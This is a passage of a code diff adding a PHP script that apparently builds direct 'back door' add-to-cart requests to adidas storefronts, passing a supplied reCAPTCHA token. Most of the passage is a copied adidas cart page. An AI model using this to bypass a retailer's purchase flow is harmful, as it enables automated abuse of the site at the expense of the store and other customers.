@@ -1,7 +1,4570 @@
+<?php
+  $marketsList=[];
+  $marketsList['AT']='de_AT';
+  $marketsList['AU']='en_AU';
+  $marketsList['BE']='fr_BE';
+  $marketsList['BR']='pt_BR';
+  $marketsList['CA']='en_CA';
+  $marketsList['CL']='es_CL';
+  $marketsList['CO']='es_CO';
+  $marketsList['CZ']='cz_CZ';
+  $marketsList['DE']='de_DE';
+  $marketsList['DK']='da_DK';
+  $marketsList['ES']='es_ES';
+  $marketsList['FI']='fi_FI';
+  $marketsList['FR']='fr_FR';
+  $marketsList['IE']='id_ID';
+  $marketsList['IT']='it_IT';
+  $marketsList['MX']='es_MX';
+  $marketsList['NL']='nl_NL';
+  $marketsList['NZ']='en_NZ';
+  $marketsList['PL']='pl_PL';
+  $marketsList['RU']='ru_RU';
+  $marketsList['SE']='sv_SE';
+  $marketsList['SK']='sk_SK';
+  $marketsList['GB']='en_GB';
+  $marketsList['US']='en_US';
+
+  $marketDomainList=[];
+  $marketDomainList["AT"]="adidas.at";
+  $marketDomainList["AU"]="adidas.com.au";
+  $marketDomainList["BE"]="adidas.be";
+  $marketDomainList["BR"]="adidas.com.br";
+  $marketDomainList["CA"]="adidas.ca";
+  $marketDomainList["CL"]="adidas.cl";
+  $marketDomainList["CO"]="adidas.co";
+  $marketDomainList["CZ"]="adidas.cz";
+  $marketDomainList["DE"]="adidas.de";
+  $marketDomainList["DK"]="adidas.dk";
+  $marketDomainList["ES"]="adidas.es";
+  $marketDomainList["FI"]="adidas.fi";
+  $marketDomainList["FR"]="adidas.fr";
+  $marketDomainList["IE"]="adidas.ie";
+  $marketDomainList["IT"]="adidas.it";
+  $marketDomainList["MX"]="adidas.mx";
+  $marketDomainList["NL"]="adidas.nl";
+  $marketDomainList["NZ"]="adidas.co.nz";
+  $marketDomainList["PL"]="adidas.pl";
+  $marketDomainList["RU"]="adidas.ru";
+  $marketDomainList["SE"]="adidas.se";
+  $marketDomainList["SK"]="adidas.sk";
+  $marketDomainList["GB"]="adidas.co.uk";
+  $marketDomainList["US"]="adidas.com";
+?>
+<?php if ( (isset($_POST['atcPostContinueShopping'])) && (strlen($_POST['atcPostContinueShopping'])>0) ): ?>  <!-- Process ATC via Continue Shopping -->
+<?php
+  //Parse POST parameters
+  $pid=$_POST['pid'];
+  $masterPid=$_POST['masterPid'];
+  $gcaptcha=$_POST['gcaptcha'];
+  $clientId=$_POST['clientId'];
+  $locale=$_POST['locale'];
+
+  $baseRestoreBasketUrl="http://www.".$marketDomainList[$locale];
+  $baseADCURL="http://www.".$marketDomainList[$locale]."/on/demandware.store/Sites-adidas-".$locale."-Site/".$marketsList[$locale];
+  $atcURL=$baseADCURL."/Cart-MiniAddProduct";
+  $cartShowURL=$baseADCURL."/Cart-Show";
+
+  if ((strlen($gcaptcha)>1))
+  {
+    $backDoorADCURL=$atcURL."?pid=".$pid."&masterPid=".$masterPid."&ajax=true&g-recaptcha-response=".$gcaptcha;
+  }
+  else
+  {
+    $backDoorADCURL=$atcURL."?pid=".$pid."&masterPid=".$masterPid."&ajax=true";
+  }
+
+  $response=<<<EOT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" >
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<head>
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Content-Language" content="en-US">
+
+
+
+
+  <meta http-equiv="x-dns-prefetch-control" content="on" />
+
+
+    <link rel="dns-prefetch" href="//demandware.edgesuite.net" />
+
+
+    <link rel="dns-prefetch" href="//hp.static.adidas.com" />
+
+
+    <link rel="dns-prefetch" href="//tags.tiqcdn.com" />
+
+
+    <link rel="dns-prefetch" href="//cdn.optimizely.com" />
+
+
+    <link rel="dns-prefetch" href="//adidas.ugc.bazaarvoice.com" />
+
+
+    <link rel="dns-prefetch" href="//maps.googleapis.com" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <meta property="og:type" content="website" />
+
+    <meta property="og:site_name" content="adidas United States" />
+
+    <meta property="fb:admins" content="100002410377144" />
+
+    <meta property="og:url" content="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show" />
+
+
+
+
+
+
+
+<title>adidas Official Website | adidas</title>
+
+
+
+<!--[if lte IE 8]>
+<script type="text/javascript">
+  document.createElement('segment');
+</script>
+<![endif]-->
+
+
+
+<!-- build page type:cart -->
+
+<link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/fonts.css" type="text/css" rel="stylesheet" />
+
+<!-- cart -->
+<link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/adidas-build-COMMON.css" type="text/css" rel="stylesheet" />
+
+<link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/adidas-build-cart.css" type="text/css" rel="stylesheet" />
+
+<!--[if lt IE 10]>
+<link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/adidas-build-COMMON-iefix.css" type="text/css" rel="stylesheet" />
+<![endif]-->
+<link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/local.css" type="text/css" rel="stylesheet" />
+<!--[if IE 8]><link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/ie8_global.css" type="text/css" rel="stylesheet" /><![endif]-->
+<!--[if IE 9]><link href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/css/ie9_global.css" type="text/css" rel="stylesheet" /><![endif]-->
+
+
+<link rel="icon" href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/default/dw31ad4eff/images/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/default/dw31ad4eff/images/favicon.ico" type="image/x-icon" />
+<link rel="apple-touch-icon-precomposed" href="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/default/dwc3cad1ba/images/apple-touch-icon-precomposed.png" />
+<link href="https://plus.google.com/101842039723189178420" rel="publisher" />
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+
+
+
+<meta name="robots" content="noindex, follow">
+
+
+<meta property="fb:app_id" content="129087217170262" />
+
+<meta name = "format-detection" content = "telephone=no" />
+
+
+
+
+
+
+
+
+<!--[if lte IE 8]>
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/iefix.js" type="text/javascript"></script>
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/json2.min.js" type="text/javascript"></script>
+<![endif]-->
+
+
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/vendor/require.js" type="text/javascript"></script>
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/vendor/jquery-1.8.3.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery.curCSS = jQuery.css;
+</script>
+<!--[if lte IE 9]>
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/jquery.placeholder.js" type="text/javascript"></script>
+<script type="text/javascript">jQuery(function () { try { jQuery('input, textarea').placeholder(); } catch(e) {} });</script>
+<![endif]-->
+<!-- cart -->
+<script type="text/javascript">
+window.app=jQuery.extend(window.app || {}, {isBuilded:true,bundlesRequired:
+["https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/adidas-build-COMMON.js"
+
+,"https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/adidas-build-cart.js"
+
+]});
+</script>
+<script src="https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/js/vendor/web-event.js" type="text/javascript"></script>
+
+
+
+
+<script type="text/javascript">
+
+
+
+
+
+(function () {
+'use strict';
+app.constants = {};
+app.resources = {};
+app.minicart = {};
+app.URLs = {};
+app.minicart.oldLayerToNew = (function (map) {
+return function (layer, defaultValue) {
+return map[layer] || defaultValue;
+};
+}({
+"minicart": "Mini cart",
+"overlay": "Add To Bag overlay",
+"straightcart": "Straight to Cart"
+}));
+app.isMobile = false;
+app.isAdidas = true;
+app.isReebok = false;
+app.isCrossfit = false;
+app.isBrooklynNets = false;
+app.minicart.url = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-MiniAddProduct";
+app.minicart.show = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-MiniCart";
+app.minicart.productCountUrl = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-ProductCount";
+app.URLs.personalizedBasketCheck = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-ValidatePersonalizationBasket";
+app.URLs.deliveryStart = "/us/delivery-start";
+app.URLs.getFullProductUrl = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Product-Show";
+app.URLs.getProductUrl = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-Show";
+app.URLs.getVariants = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-GetVariants";
+app.URLs.getMasterAvailability = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-GetMasterAvailability";
+app.URLs.getAvailability = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-GetAvailability";
+app.URLs.loadingSmallImg = "/on/demandware.static/Sites-adidas-US-Site/-/default/dwba17e999/images/loading-small.gif";
+app.URLs.formatMoney = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-FormatPrices";
+app.URLs.removeImg = "/on/demandware.static/Sites-adidas-US-Site/-/default/dwc8e53f09/images/icon_remove.gif";
+app.URLs.getProductTileList = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-GetTiles";
+app.URLs.getAssetContent = "/on/demandware.store/Sites-adidas-US-Site/en_US/Page-Include";
+app.URLs.jsonConfiguratorLink = "http://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Configurator-GetJsonURL";
+app.URLs.sendToFriend = "http://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/SendToFriend-Start";
+app.URLs.blankImg = "/on/demandware.static/Sites-adidas-US-Site/-/default/dw56d45f8a/images/blank.gif";
+app.URLs.showImage = "http://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Product-ShowImage";
+app.URLs.searchSuggestURL = "/on/demandware.store/Sites-adidas-US-Site/en_US/Search-GetSuggestions";
+app.URLs.viewAllSuggestURL = "/us/search";
+app.URLs.cartSummaryBlock = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-GetCartSummaryBlock";
+app.URLs.pageHeaderInfo = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Page-HeaderInfo";
+app.URLs.includeHeaderCustomerInfo = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Home-IncludeHeaderCustomerInfo";
+app.URLs.accountShow = "https://www.adidas.com/us/myaccount";
+app.URLs.loginLogout = "https://www.adidas.com/us/login-logout";
+app.URLs.deliverySubmits = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-Submits";
+app.URLs.deliveryCnC = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/OmniChannel-ShowOnDelivery";
+app.URLs.showCartURL = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show";
+app.URLs.lookupEmail = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-LookupEmail";
+app.URLs.paymentPage = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/COSummary-Start";
+app.URLs.SLPBazaarVoice = "http://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Search-SLPBazaarVoice";
+app.URLs.linkPlayerSkin = "https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/default/dwfee10d06/images/jwplayer/AdiSkin.xml";
+app.URLs.linkFlashPlayer = "https://www.adidas.com/on/demandware.static/Sites-adidas-US-Site/-/default/dw282d287b/images/jwplayer/player-licensed.swf";
+app.URLs.loginValidationURL = "/on/demandware.store/Sites-adidas-US-Site/en_US/ShopRunner-ValidateToken";
+app.URLs.getShipmentMethods = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-GetShippingOptions";
+app.URLs.storeSelectedPostamat = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Helpers-StoreValueInSession";
+app.URLs.savePostNumberID = "/on/demandware.store/Sites-adidas-US-Site/en_US/OmniChannel-setPostNumberId";
+app.URLs.fillInScheduledDelivery = "/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-FillInScheduledDelivery";
+app.URLs.getAddressTemplate = "/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-GetAddressTemplate";
+app.URLs.getEPOCHAvailability = "/on/demandware.store/Sites-adidas-US-Site/en_US/OmniChannel-GetEPOCHAvailability";
+app.URLs.getUspBar = "/on/demandware.store/Sites-adidas-US-Site/en_US/Page-GetUSPBar";
+app.URLs.setSubscriptionFlagUrl = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/COPayment2-SetNewsletterFlag";
+app.URLs.productComparisonPage = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-Comparison";
+app.URLs.createComingSoonSignup = "/on/demandware.store/Sites-adidas-US-Site/en_US/SCV-CreateCommingSoonSignup";
+app.URLs.PERSONALIZATION_BASE_URL = "http://cfg.adidas.com";
+app.URLs.PERSONALIZATION = {
+ppr: "/configurator/services/miadidas-configurator/ppdo/article/{article}/region/{region}/channel/{channel}/partner/{partner}",
+rr: "/configurator/services/miadidas-configurator/pRecipeService/recipeIdent/{recipeIdent}/region/{region}/channel/{channel}/partner/{partner}",
+plr: "/configurator/services/miadidas-configurator/sldProfanity/productTypeId/{productType}/specialType/Personalization/region/{region}/channel/{channel}/partner/{partner}",
+ic: "/configurator/services/miadidas-configurator/pRecipeService/validateinventory/deductInventory/{deductInventory}/region/{region}/channel/{channel}/partner/{partner}"
+};
+app.URLs.getBVReviews = "/on/demandware.store/Sites-adidas-US-Site/en_US/Product-GetBVReview";
+app.URLs.HelpSuggest = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Help-Suggest?q=";
+// Preferences
+app.CommissionJunctionEnable = false;
+app.noneCom = false;
+app.shoprunnerEnabled = true;
+app.epochShipFromStoreEnabled = false;
+app.shoprunnerRetailerID = "ADIDAS";
+app.shoprunnerEnvironmentID = "2";
+app.minimumInstallmentAmount = "null";
+app.contentURL = "";
+
+/*constants*/
+app.constants.AVAIL_STATUS_IN_STOCK="IN_STOCK";
+app.constants.AVAIL_STATUS_PREORDER="PREORDER";
+app.constants.AVAIL_STATUS_BACKORDER="BACKORDER";
+app.constants.AVAIL_STATUS_NOT_AVAILABLE="NOT_AVAILABLE";
+app.constants.AVAIL_STATUS_PREVIEW="PREVIEW";
+app.constants.LOCALE="en_US";
+app.constants.SITE_ID="adidas-US";
+app.constants.LAZY_LOAD_SPACE="400";
+app.constants.PRODUCT_MAX_QTY_THRESHOLD="5";
+app.constants.GENERIC_MAX_QTY_THRESHOLD="0";
+app.constants.CURRENCY_CODE = "USD";
+app.constants.HIDE_SHIPPING_METHODS_ON_CART = true;
+app.constants.ADDRESS_VALIDATION_PROVIDER = "Avatax";
+app.constants.ADDRESS_DOCTOR_IMPROVEMENT = "false";
+app.constants.ADDRESS_DOCTOR_POPUP_TITLE = "Verify your address";
+app.constants.USE_SPLITTED_DELIVERY = false;
+app.constants.PERSONALIZATION_CHANNEL = "1";
+app.constants.PERSONALIZATION_PARTNER = "null";
+/*resources*/
+app.resources["LIMIT_QUANTITY"]="Limited to {0} item(s) per purchase";
+app.resources["MISSINGVAL"]="Please Enter {0}";
+app.resources["SERVER_ERROR"]="Server connection failed!";
+app.resources["MISSING_LIB"]="jQuery is undefined.";
+app.resources["MISSING_APP_LIB"]="app is undefined.";
+app.resources["BAD_RESPONSE"]="Bad response, Parser error";
+app.resources["INVALID_PHONE"]="Please specify a valid phone number.";
+app.resources["REMOVE"]="Remove";
+app.resources["QTY"]="Quantity";
+app.resources["SEARCH_TEXT"]="Search";
+app.resources["NOHITS_SEARCH_TEXT"]="Search";
+app.resources["PRICE_EXAMPLE"] = '$1,234.00';
+app.resources["SHIPPINGCOSTFREE"] = "FREE";
+app.resources["NO_REVIEWS"]="There are no reviews for this product";
+app.resources["STICKVOGEL_POPUP_TITLE"]="stickvogel.popuptitle";
+app.resources["MOBILE_COOKIE_EXPIRATION_DATE"] = "null";
+app.resources["DEV_INSTANCE_WARNING"] = "This is NOT A LIVE SITE. This is test environment. Do NOT place orders.";
+app.resources["LOGIN_LOGOUT_TEXT"] = "Logout";
+app.resources["SIZE_LABEL"] = "Size";
+app.resources["ZOOM_TYPE"] = "default";
+app.resources["ZOOM_MESSAGE"] = "LOADING";
+app.resources["CURSOR_URL_IMAGE"] = "/on/demandware.static/Sites-adidas-US-Site/-/default/dwe3e7d33c/images/cursor-zoomed-circle.cur";
+app.resources["GLOBAL_UPDATE"] = "Update";
+app.resources["GLOBAL_LOADING"] = "Loading";
+app.resources["GLOBAL_CONFIRM_UPDATE"] = "Confirm your update";
+app.resources["CLICKCOLLECT_UNAVAILABLE_TITLE_MESSAGE"] = "Because of an update to your bag, click & collect is no longer available and delivery times have changed.";
+app.resources["CLICKCOLLECT_UNAVAILABLE_MESSAGE"] = "Please select one of the updated delivery options and time-slots below.";
+app.resources["CLICKCOLLECT_AVAILABLE_TITLE_MESSAGE"] = "Because of an update to your bag, click & collect and new delivery times and are now available.";
+app.resources["CLICKCOLLECT_AVAILABLE_MESSAGE"] = "Please select one of the updated delivery options and time-slots below.";
+app.resources["MINICART_CLICKCOLLECT_UNAVAILABLE"] = "With this update to your bag, click & collect is now available and your delivery times will change. You will be taken back to the delivery page.";
+app.resources["MINICART_CLICKCOLLECT_AVAILABLE"] = "With this update to your bag, click & collect will no longer be available and your delivery times will change. You will be taken back to the delivery page.";
+app.resources["CLICKCOLLECT_SCHEDULED_DELIVERY_UNAVAILABLE_TITLE_MESSAGE"] = "Because of an update to your bag, click & collect and sechulded delivery are no longer available and delivery times have changed.";
+app.resources["CLICKCOLLECT_SCHEDULED_DELIVERY_UNAVAILABLE_MESSAGE"] = "Please select one of the updated delivery options and time-slots below.";
+app.resources["CLICKCOLLECT_SCHEDULED_DELIVERY_AVAILABLE_TITLE_MESSAGE"] = "Because of an update to your bag, click & collect, scheduled delivery and new delivery times  are now available.";
+app.resources["CLICKCOLLECT_SCHEDULED_DELIVERY_AVAILABLE_MESSAGE"] = "Please select one of the updated delivery options and time-slots below.";
+app.resources["CLICKCOLLECT_AVAILABLE_TIMEINTERVAL_TITLE_MESSAGE"] = "Because you updated your bag, new delivery times are now available.";
+app.resources["CLICKCOLLECT_AVAILABLE_TIMEINTERVAL_MESSAGE"] = "Please select one of the updated delivery time-slots";
+app.resources["MINICART_TIMEINTERVAL"] = "With this update, your delivery times will change. You will be taken back to the delivery page.";
+app.resources["MINICART_CLICKCOLLECT_SCHEDULED_DELIVERY_UNAVAILABLE"] = "With this update to your bag, click & collect and scheduled delivery will no longer be available and your delivery times will change . You will taken back to the delivery page.";
+app.resources["MINICART_CLICKCOLLECT_SCHEDULED_DELIVERY_AVAILABLE"] = "With this update to your bag, click & collect and scheduled delivery are now available and your delivery times will change. You will be  taken back to the delivery page.";
+app.resources["PROCESSING_PAYMENT"] = "Processing payment";
+app.resources["IMAGE_LOADING"] = "Loading image";
+app.resources.PERSONALIZATION_TEXTS = {
+'nameAndNumber': "Add name & number",
+'pName-pNumber.nameAndNumber.textwithDropDown': "Select Player",
+'pName-pNumber.nameAndNumber': "Choose your own",
+'pName-pNumber.nameOfnameAndNumber': "Name",
+'pName-pNumber.numberOfnameAndNumber': "00",
+'pNumber.nameAndNumber.textNumber': "Text",
+'pName-pName-pNumber.nameAndNumber.textwithDropDown': "Select Player",
+'pName-pName-pNumber.nameAndNumber': "Choose your own",
+'pName-pName-pNumber.nameOfnameAndNumber': "personalization.pName-pName-pNumber.nameOfnameAndNumber.displayText",
+'pName-pName-pNumber.numberOfnameAndNumber': "personalization.pName-pName-pNumber.numberOfnameAndNumber.displayText",
+'pName-pName-pNumber.nameOnly': "personalization.pName-pName-pNumber.nameOnly.displayText",
+'left_text.text': "Left shoe (A-Z, 0-9)",
+'right_text.text': "Right shoe (A-Z, 0-9)"
+};
+/* postal code lookup*/
+app.resources["ENABLE_POSTAL_CODE_LOOKUP"] = false;
+app.resources["POSTAL_CODE_LOOKUP_MANUAL"] = false;
+app.resources["POSTAL_CODE_LOOKUP_BILLING_MANUAL"] = null;
+app.resources["CODELIVERY_POSTAL_CODE_LOOKUP_MANUAL"] = "/on/demandware.store/Sites-adidas-US-Site/en_US/CODelivery-PostalCodeLookUpManual";
+app.resources["POSTAL_LOADING"] = "Loading...";
+app.resources["POSTAL_FINDADDRESS"] = "Find Address";
+app.resources["POSTAL_NO_ADDRESS_SUGGESTION"] = "Adderess not found? <span class='postal-enter-manually'>Enter manually</span>";
+app.resources["POSTAL_NO_ADDRESS_SUGGESTION_MOBILE"] = "Adderess not found? Enter manually";
+app.resources["SELECT_YOUR_ADDRESS"] = "Select your address";
+app.resources["EDIT_YOUR_ADDRESS"] = "Edit Address";
+app.resources["POSTAL_LOADING_ERROR_SELECT_ADDRESS"] = "Please choose your address";
+app.resources["ADDRESS_SUGGESTION_FAIL_SERVICE"] = "We are sorry, validation service is unavailable right now";
+/*product availability messages*/
+app.resources["IN_STOCK"]="In Stock";
+app.resources["QTY_IN_STOCK"]="{0} Item(s) In Stock";
+app.resources["PREORDER"]="<span style=\"color:green;font-weight:bold;\">PRE-ORDER NOW!</span> Only {0} days left to Pre-order";
+app.resources["QTY_PREORDER"]="{0} item(s) are available for Pre-order.";
+app.resources["REMAIN_PREORDER"]="The remaining items are available for Pre-order.";
+app.resources["BACKORDER"]="Back Order";
+app.resources["QTY_BACKORDER"]="Back Order {0} item(s)";
+app.resources["REMAIN_BACKORDER"]="The remaining items are available on back order.";
+app.resources["NOT_AVAILABLE"]="This item is currently not available.";
+app.resources["REMAIN_NOT_AVAILABLE"]="The remaining items are currently not available. Please adjust the quantity.";
+app.resources["IN_STOCK_DATE"]="The expected in-stock date is {0}.";
+app.resources["NON_SELECTED"]="Not Selected";
+app.resources["MISSING_VAL"]="Select {0}";
+app.resources["SIZECHART_TITLE"]="Size Chart";
+app.resources["SEND_TO_FRIEND"]="Send to a Friend";
+app.resources["QTY_LIMIT_MESSAGE"]="Only {0} left in stock";
+app.resources["LOW_LIMIT_MESSAGE"]="Low in stock";
+/*add resources for preview*/
+app.resources["PREVIEW"]="<span class=\"callout-bar-headline\">COMING SOON!</span><span class=\"callout-bar-short\"><span class=\"callout-bar-text\">Available in </span><span class=\"callout-bar-day-count\">{0} day(s)</span></span>";
+app.resources["ADD_TO_CART_COMING_SOON"]="Coming Soon";
+app.resources["ADD_TO_CART_PREORDER"]="Pre-order now";
+/*Comparison*/
+app.resources["COMPARE_SINGLE"] ="{0}/{1} selected";
+app.resources["COMPARE_PLURAL"] ="{0}/{1} selected";
+app.resources["COMPARE_INFORM"] ="0/{0} selected";
+/* bonus products messages*/
+app.resources["BONUS_PRODUCTS"]="Bonus Product(s)";
+app.resources["SELECT_BONUS_PRODUCT"]="Select";
+app.resources["BONUS_PRODUCT_MAX"]="The maximum number of bonus products have been selected.  Please remove one in order to add additional bonus products.";
+app.resources['QUICKVIEW_TITLE']="Edit Product";
+app.resources['ADD_TO_CART_BUTTON_TITLE']="Add To Bag";
+app.resources['PRE_ORDER_BUTTON_TITLE']="Pre-order Now";
+app.resources['BACK_ORDER_BUTTON_TITLE']="Backorder add to bag";
+app.resources['UPDATE_BUTTON_TITLE']="Update";
+/* miproduct page*/
+app.resources["BLOCKER_MESSAGE_title"]="You are leaving the current page.";
+app.resources["BLOCKER_MESSAGE_message"]="Your design has not been saved.";
+app.resources["BLOCKER_MESSAGE_button_continue"]="Continue without saving";
+app.resources["BLOCKER_MESSAGE_button_cancel"]="Cancel";
+app.resources["BLOCKER_MESSAGE_survey_text"]="Help us make customization even easier.<br />Please tell us what you think.";
+app.resources["BLOCKER_MESSAGE_survey_linktext"]="Take our survey";
+app.resources["DESIGN_GALLERY_TITLE"]="Design Search";
+app.resources["DESIGN_GALLERY_CLOSE1"]="The";
+app.resources["DESIGN_GALLERY_CLOSE2"]="Gallery";
+/* personalization*/
+app.resources["LEARN_MORE_URL"] = "/on/demandware.store/Sites-adidas-US-Site/en_US/Page-Include?cid=personalization-learn-more";
+app.resources["LEARN_MORE_URL_FTW"] = "/on/demandware.store/Sites-adidas-US-Site/en_US/Page-Include?cid=personalization-learn-more-ftw";
+app.resources["LEARN_MORE_TITLE"] = "?";
+app.resources["PERSONALIZED_PRODUCT_BASKET_CHECK_URL"] = "/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-PersonalizedProductCountInBasket?size=13";
+app.resources["TOO_MANY_PERSONALIZED_IN_BASKET"] = "You added too many personalization products to the basket";
+app.resources["OUT_OF_STOCK"] = "The personalization you’ve created is unavailable based on the combination of letters and numbers selected. Alternate combinations may be available.";
+app.resources["BADGE_OUT_OF_STOCK"] = "Your personalization is unavailable based on the combination of letters and numbers selected. Alternate combinations may be available.";
+app.resources["SERVICE_ERROR"] = "Oops, something went wrong. Could you please try again?";
+app.resources["PERSONALIZATION_BASE_URL"] = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/PersonalizationService-Start";
+app.resources["NOT_VALID_INPUT_PERSONALIZATION"] = "Sorry, this is not supported by our system. Please try again.";
+app.resources["NOT_VALID_INPUT_SPECIFY_VALUE"] = "Please specify value";
+app.resources["PERSONALIZATION_ADD_A_BADGE"] = "Add a badge";
+app.resources["PERSONALIZATION_PREVIEW"] = "Preview";
+app.resources["MIADIDAS_BASE_URL"] = "http://cfg.adidas.com";
+app.resources["CLEAR_ALL"] = "Clear all";
+app.resources["FOOTWEAR_HEADER"] = "Add something personal";
+/* search suggestions*/
+app.resources["ENABLE_DEMANDWARE_SUGGESTIONS"] = true;
+app.resources["ENABLE_CATEGORY_SUGGESTIONS"] = false;
+app.resources["ENABLE_PRODUCT_SUGGESTIONS"] = true;
+app.resources["MINIMUM_CHARACTERS_FOR_SUGGESTION"] = 3;
+app.resources["SEARCH_SUGGESTIONS"] = "Suggestions";
+app.resources["CATEGORY_SUGGESTIONS"] = "Categories";
+app.resources["PRODUCT_SUGGESTIONS"] = "Products";
+app.resources["PRODUCT_SUGGESTIONS_PRICE"] = "Price:";
+app.resources["VIEW_ALL_RESULTS_SUGGESTIONS"] = "View All Results";
+app.resources["VIEW_ALL"] = "View All";
+app.resources["RESULTS"] = "results";
+// redirects
+app.resources["REDIRECT_TITLE"] = "You will be redirected";
+app.resources["REDIRECT_CTA"] = "CONTINUE";
+app.resources["REDIRECT_MESSAGE"] = "to our adidas {0} online shop. This is where you find the widest range of {1} products. Your account details are all the same, but you will have a different shopping bag to fill. In case of questions, a team of specialty sports customer service advisors are here to help.";
+app.resources["REDIRECT_HOSTNAMES"] = "y-3,adidasbodycare,adidasspecialtysports,adidashardware";
+app.resources["REDIRECT_NAMES"] = "";
+/* CO DocumentTypeID validation */
+app.resources["FORMS_DOCUMENTTYPEID_NIT_ERROR"] = "Invalid NIT value!";
+app.resources["FORMS_DOCUMENTTYPEID_CC_ERROR"] = "Invalid CC value!";
+app.resources["FORMS_DOCUMENTTYPEID_CE_ERROR"] = "Invalid CE value!";
+app.resources["FORMS_DOCUMENTTYPEID_Pasaport_ERROR"] = "Invalid Passport value!";
+app.resources["FORMS_DOCUMENTTYPEID_TI_ERROR"] = "Invalid TI value!";
+/* waitlist*/
+app.resources["WAITLIST"] = true;
+/* expandable block*/
+app.resources["EXPANDABLE_READ_MORE"] = "Read more";
+app.resources["EXPANDABLE_READ_LESS"] = "Read less";
+/* Adyen*/
+app.resources["ADYENERRORS_CARD_EXPIRED"] = "errorforms.adyenencrypted.expiryDate.valueerror";
+/*NEWSLETTERS*/
+app.resources['VALID_EMAIL_ERROR'] = "Please enter a valid Email Address";
+app.resources['NEWSLETTER_SUBSCRIBE_URL'] = "https://www.adidas.com/us/subscribe";
+app.resources['NEWSLETTER_SUBSCRIBE_FOOTER_LABEL'] = "Sign up for news & get <span>15% off</span>";
+app.resources['SIGNUPANDSAVE_GENERAL_ERROR'] = "Oops, we're sorry! Because of site maintenance this service is not available.";
+app.resources['LEGAL_NEWSLETTER_AGE_CONSENTTYPE'] = "dob-dropdowns";
+app.resources["SHIPPING_METHOD_DEPENDENCIES"] = "%7B%22dwfrm_delivery_singleshipping_shippingAddress_addressFields_countyProvince%22%3A%20%22stateCode%22%2C%20%22dwfrm_delivery_singleshipping_shippingAddress_addressFields_address1%22%3A%20%22address1%22%2C%20%22dwfrm_delivery_singleshipping_shippingAddress_addressFields_address2%22%3A%20%22address2%22%7D";
+app.resources['SHIPPING_OPTIONS'] = 'Delivery Method <div class="floated-popup"><a class="showdialog" href="/on/demandware.store/Sites-adidas-US-Site/en_US/Page-Include?cid=basket-shippinginfo-content" data-component="common/ShowDialog">&nbsp;</a></div>';
